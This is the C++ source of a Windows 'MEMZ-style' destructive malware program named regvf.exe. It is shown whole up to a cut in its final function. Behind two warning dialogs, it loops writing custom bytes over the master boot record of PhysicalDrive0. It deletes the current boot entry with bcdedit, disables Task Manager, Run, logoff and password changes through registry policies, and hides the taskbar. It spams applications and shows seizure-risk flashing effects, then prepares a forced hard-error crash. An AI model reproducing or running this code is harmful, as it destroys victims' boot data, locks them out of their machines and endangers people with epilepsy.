#include <windows.h>
#include <math.h>
#pragma comment(lib, "winmm.lib")

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;

int red = 0, green = 0, blue = 0; //credits to GetMbr for this HSL
bool ifblue = false;

COLORREF Hue(int length) {
    if (red != length) {
        red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else if (green != length) {
        green++;
        return RGB(length, green, 0);
    }
    else if (blue != length) {
        blue++;
        return RGB(0, length, blue);
    }
    else {
        red = 0; 
        green = 0; 
        blue = 0;
        ifblue = true;
        return RGB(0, 0, 0);
    }
}

const unsigned char MasterBootRecord[] = {0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xFF, 0x8E, 0xDF,
0xD9, 0x06, 0x7B, 0x7C, 0xBD, 0xC8, 0x00, 0xD9, 0x06, 0x7B, 0x7C, 0xBA, 0x40, 0x01, 0xD9, 0xEE,
0xD9, 0xEE, 0xB0, 0x64, 0xD9, 0xC0, 0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xE9, 0xD8, 0xC3,
0xD9, 0xC1, 0xD9, 0xC3, 0xDE, 0xC9, 0xDC, 0xC0, 0xD8, 0xC5, 0xDD, 0xDB, 0xDD, 0xD9, 0xD9, 0xC0,
0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xC1, 0xDF, 0x1E, 0x87, 0x7C, 0x83, 0x3E, 0x87, 0x7C,
0x04, 0x7D, 0x04, 0xFE, 0xC8, 0x75, 0xCD, 0xDD, 0xD8, 0xDD, 0xD8, 0x01, 0xF0, 0xAA, 0xD8, 0x06,
0x73, 0x7C, 0x4A, 0x75, 0xB9, 0xDD, 0xD8, 0xD8, 0x06, 0x77, 0x7C, 0x4D, 0x75, 0xA9, 0x46, 0xDD,
0xD8, 0xEB, 0x99, 0x9A, 0x99, 0x19, 0x3C, 0x8F, 0xC2, 0x75, 0x3C, 0x00, 0x00, 0xC0, 0xBF, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}

DWORD WINAPI Disabler(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}

DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}


DWORD WINAPI rgbtrain(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI mash(LPVOID lpParam)
{
    while (1)
    {
        HDC hdc = GetDC(HWND_DESKTOP);
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI lines(LPVOID lpParam)
{
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    while (1)
    {
        HDC hdc = GetDC(HWND_DESKTOP);
        MoveToEx(hdc, rand() % w, rand() % h, NULL);
        LineTo(hdc, rand() % w, rand() % h);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI textout1(LPVOID lpvd)
{
    int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
    while(1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, TRANSPARENT);
        LPCSTR text = "regvf.exe";
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, text, strlen(text));
        DeleteObject(font);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += 100)
        {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
    return 0;
}

DWORD WINAPI icon(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hdc, x, y, LoadIcon(0, IDI_ERROR));
        Sleep(10);
        InvalidateRect(0, 0, 0);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI stretch(LPVOID lpParam) {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), power = 74;
    while (1) {
        for (int angle = 0; angle < 361; angle += 1) {
            HDC hdc = GetDC(0);
            int x = power * cos(angle * 3.14159 / 180.0), y = power * sin(angle * 3.14159 / 180.0);
            StretchBlt(hdc, x / 2, y / 2, sw - x, sh - y, hdc, 0, 0, sw, sh, NOTSRCERASE);
            ReleaseDC(0, hdc);
            Sleep(10);
        }
    }
    return 0;
}

DWORD WINAPI shader1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int j = 0; j < w * h; j++) {
            int x = j % w, y = j / h, t = y ^ y | x;
            data[j].rgb -= RGB(x, y, t);
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI train2(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI bitblt1(LPVOID lpParam) {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);

    while (true)
    {
        HDC hdc = GetDC(0);
        BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sh, sw, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sw, sh, hdc, 0, 0, PATINVERT);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

VOID WINAPI ci2(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef2(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += 100)
        {
            ci2(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
    return 0;
}

DWORD WINAPI textout2(LPVOID lpvd)
{
    int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
    while (1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, TRANSPARENT);
        LPCSTR text = "R.I.P DUMB USER!";
        SetTextColor(hdc, Hue(239));
        HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, text, strlen(text));
        DeleteObject(font);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI bouncingball(LPVOID lpvd){
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        x += incrementor * signX;
        y += incrementor * signY;
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN) - 100)
        {
            signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN) - 100)
        {
            signX = -1;
        }
        if (y <= 0)
        {
            signY = 1;
        }
        if (x <= 0)
        {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI shader2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int j = 0; j < w * h; j++) {
            data[j].r *= (j % 255);
            data[j].g ^= (j % 255);
            data[j].b |= (j % 255);
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI OpenApps(LPVOID lpParam) {
    while (true) {
        ShellExecute(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "mspaint.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "write.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "control.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "xwizard.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "WorkFolders.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "WmiMgmt.msc", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "dxdiag.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "taskmgr.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "wmplayer.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "powershell.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "winver.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "MRT.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "charmap.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "SnippingTool.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "mstsc.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "msra.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
        
        ShellExecute(NULL, "open", "regedit.exe", NULL, NULL, SW_SHOW);
        Sleep(10);
    }
    return 0;
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 9 ^ (t >> 8) - 1 ^ 1) % 13 * t & 31) * (2 + (t >> 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t - ((t >> (t & 7000 ? 3 : 10) >> 1 | t) & t >> 10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 7 : 5) * (2 - (2 & t >> 9) + (3 & t >> 8)) >> (3 & -t >> (t % 65536 < 59392 ? t & 4096 ? 2 : 16 : 2)) | t >> 3);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (3 + (1 & t >> 8)) >> (2 & t >> 8) | t >> 4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 2) * (t & (t & 32768 ? 16 : 24) | t >> (t >> 8 & 28)) | t >> 3);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8300, 8300, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8300 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 4 | t * t * (t >> 6 & 8 ^ 8) * (t >> 11 ^ t / 3 >> 12) / (7 + (t >> 10 & t >> 14 & 3)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 8 | t >> 9) & 25));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 8 | t >> 10) & 30) & t << 1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int main()
{
    if (MessageBoxW(NULL, L"THIS IS A MALWARE! IF YOU SURE TO RUN IT, PRESS THE YES BUTTON TO START IT!", L"regvf.exe by VietNamLover", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"It contains flashing lights, it not for epilepsy and it will harm your computer! STILL WANT TO EXECUTE IT?!", L"regvf.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            CreateThread(0, 0, MBRWiper, 0, 0, 0);
            Sleep(1000);
			CreateThread(0, 0, Disabler, 0, 0, 0);
			Sleep(1000);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			Sleep(3000);
            HANDLE thread1 = CreateThread(0, 0, rgbtrain, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100); 
            HANDLE thread2 = CreateThread(0, 0, mash, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, lines, 0, 0, 0);
            HANDLE thread2dot2 = CreateThread(0, 0, wef, 0, 0, 0);
            HANDLE thread2dot3 = CreateThread(0, 0, textout1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2dot1);
            TerminateThread(thread2dot2, 0);
            CloseHandle(thread2dot2);
            TerminateThread(thread2dot3, 0);
            CloseHandle(thread2dot3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, icon, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, stretch, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, train2, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, bouncingball, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, bitblt1, 0, 0, 0);
            HANDLE thread7dot1 = CreateThread(0, 0, wef2, 0, 0, 0);
            HANDLE thread7dot2 = CreateThread(0, 0, textout2, 0, 0, 0);
			CreateThread(NULL, 0, OpenApps, NULL, 0, NULL);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread8 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound8();
            Sleep(30000);
            
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
